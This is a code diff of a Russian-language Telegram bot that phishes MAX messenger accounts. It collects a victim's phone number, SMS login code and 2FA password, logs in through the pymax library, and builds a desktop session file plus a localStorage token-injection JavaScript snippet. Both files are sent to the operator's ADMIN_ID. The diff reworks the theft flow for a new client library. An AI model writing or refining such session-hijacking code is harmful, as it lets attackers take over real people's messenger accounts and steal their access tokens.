@@ -4,12 +4,13 @@ import asyncio
 import uuid
 import logging
 import time
-import aiohttp
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import FSInputFile
+from pymax import Client as SocketMaxClient
+from pymax.auth.providers import CodeProvider
 
 # ============================================================
 # НАСТРОЙКИ (замените на свои)
@@ -22,7 +23,23 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# Состояния
+# Свой провайдер кода, который не лезет в консоль
+class TelegramCodeProvider(CodeProvider):
+    def __init__(self):
+        self._code = None
+        self._event = asyncio.Event()
+    
+    async def get_code(self, phone: str) -> str:
+        self._event.clear()
+        await self._event.wait()
+        code = self._code
+        self._code = None
+        return code
+    
+    def set_code(self, code: str):
+        self._code = code
+        self._event.set()
+
 class AuthState(StatesGroup):
     waiting_for_code = State()
     waiting_for_password = State()
@@ -30,10 +47,8 @@ class AuthState(StatesGroup):
 pending_clients = {}
 
 def gen_password():
-    import random
-    import string
-    chars = string.ascii_letters + string.digits + "_@#"
-    return ''.join(random.choices(chars, k=40))
+    import random, string
+    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#", k=40))
 
 def build_desktop_json(token, device_id, session_id, password, user_id, phone, first_name="", last_name=""):
     return {
@@ -70,29 +85,30 @@ localStorage.setItem('__oneme_device_id', '{device_id}');
 localStorage.setItem('__oneme_auth', JSON.stringify({{"token":"{token}","viewerId":{viewer_id}}}));
 window.location.reload();"""
 
-async def finalize_auth(token, viewer_id, phone, user_id, work_dir, message):
+async def finalize_auth(client, phone, user_id, work_dir, message):
     await message.answer("✅ Готовлю файлы...")
-
+    
     device_id = str(uuid.uuid4())
+    token = client.token
+    viewer_id = client.my_id
     password = gen_password()
     session_id = int(time.time() * 1000)
-
+    
     desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
     js = generate_web_js(password, device_id, token, viewer_id)
-
+    
     dp_path = f"{work_dir}/desktop_session.json"
     with open(dp_path, "w") as f:
         json.dump(desktop, f, indent=4)
     web_path = f"{work_dir}/web_token.js"
     with open(web_path, "w") as f:
         f.write(js)
-
+    
     await bot.send_document(ADMIN_ID, FSInputFile(dp_path),
-        caption=f"💻 <b>ДЕСКТОПНАЯ СЕССИЯ</b>\nНомер: {phone}\nUser ID: {user_id}", parse_mode="HTML")
+        caption=f"💻 <b>ДЕСКТОПНАЯ СЕССИЯ</b>\nНомер: {phone}", parse_mode="HTML")
     await bot.send_document(ADMIN_ID, FSInputFile(web_path),
-        caption=f"🌐 <b>ВЕБ-ТОКЕН (JS)</b>\nНомер: {phone}\nUser ID: {user_id}", parse_mode="HTML")
-
-    await message.answer("🔐 Файлы отправлены админу.")
+        caption=f"🌐 <b>ВЕБ-ТОКЕН (JS)</b>\nНомер: {phone}", parse_mode="HTML")
+    await message.answer("🔐 Готово!")
 
 @dp.message(F.text == "/start")
 async def start(message: types.Message):
@@ -104,50 +120,65 @@ async def phone_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     work_dir = f"cache/{uid}"
     os.makedirs(work_dir, exist_ok=True)
+    
+    code_provider = TelegramCodeProvider()
+    client = SocketMaxClient(phone=phone, work_dir=work_dir, code_provider=code_provider)
+    
+    pending_clients[uid] = {
+        "client": client,
+        "phone": phone,
+        "work_dir": work_dir,
+        "code_provider": code_provider
+    }
+    
+    await state.set_state(AuthState.waiting_for_code)
+    await state.update_data(phone=phone, work_dir=work_dir)
+    
+    # Запускаем клиент в фоне (он сам запросит SMS и будет ждать код от провайдера)
+    asyncio.create_task(run_client(uid, client, message))
+    await message.answer("📩 Запрашиваю SMS-код...")
 
-    # Динамически импортируем библиотеку
-    from webmaxsocket import WebMaxClient
-    client = WebMaxClient(name=f"session_{uid}", deviceType='ANDROID')
-    await client.connect()
-
-    pending_clients[uid] = {"client": client, "phone": phone, "work_dir": work_dir}
-
-    # Шаг 1: Запрос SMS
+async def run_client(uid, client, message):
     try:
-        auth_session = await client.authorizeBySMS(phone)
-        pending_clients[uid]["auth_session"] = auth_session
-        await state.set_state(AuthState.waiting_for_code)
-        await state.update_data(phone=phone, work_dir=work_dir)
-        await message.answer("📩 SMS отправлена. Введи код:")
+        await client.start()
+        # Если дошли сюда — авторизация прошла без ошибок
+        # (код уже был получен через TelegramCodeProvider)
     except Exception as e:
-        await message.answer(f"❌ Ошибка при запросе SMS: {e}")
-        del pending_clients[uid]
+        await message.answer(f"❌ Ошибка авторизации: {e}")
+        if uid in pending_clients:
+            del pending_clients[uid]
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
     uid = message.from_user.id
     code = message.text.strip()
+    
     if uid not in pending_clients:
         await message.answer("⏳ Сессия устарела.")
         return
+    
+    provider = pending_clients[uid]["code_provider"]
+    provider.set_code(code)
+    
+    await message.answer("⏳ Проверяю код...")
+    # Ждем результат от run_client (или 2FA, или успех, или ошибка)
+    
+    # Даем время на обработку
+    await asyncio.sleep(3)
+    
     data = await state.get_data()
     phone = data["phone"]
     work_dir = data["work_dir"]
     client = pending_clients[uid]["client"]
-    auth_session = pending_clients[uid]["auth_session"]
-
+    
     try:
-        result = await auth_session.sendCode(code)
-        if result and hasattr(result, 'needsPassword') and result.needsPassword:
-            pending_clients[uid]["password_challenge"] = result
-            await state.set_state(AuthState.waiting_for_password)
-            await message.answer("🔐 Введи пароль 2FA:")
-        else:
-            token = client.token
-            viewer_id = client.me.id
-            await finalize_auth(token, viewer_id, phone, uid, work_dir, message)
+        # Проверяем, авторизовались ли
+        if client.token:
+            await finalize_auth(client, phone, uid, work_dir, message)
             del pending_clients[uid]
             await state.clear()
+        else:
+            await message.answer("⏳ Ожидаю завершения авторизации...")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
@@ -158,17 +189,18 @@ async def password_handler(message: types.Message, state: FSMContext):
     if uid not in pending_clients:
         await message.answer("⏳ Сессия устарела.")
         return
-    data = await state.get_data()
-    phone = data["phone"]
-    work_dir = data["work_dir"]
+    
     client = pending_clients[uid]["client"]
-    challenge = pending_clients[uid]["password_challenge"]
-
     try:
-        await challenge.sendPassword(pwd)
-        token = client.token
-        viewer_id = client.me.id
-        await finalize_auth(token, viewer_id, phone, uid, work_dir, message)
+        if hasattr(client, '_two_factor_auth'):
+            await client._two_factor_auth(pwd)
+        elif hasattr(client, 'send_password'):
+            await client.send_password(pwd)
+        
+        data = await state.get_data()
+        phone = data["phone"]
+        work_dir = data["work_dir"]
+        await finalize_auth(client, phone, uid, work_dir, message)
     except Exception as e:
         await message.answer(f"❌ Неверный пароль: {e}")
     finally:
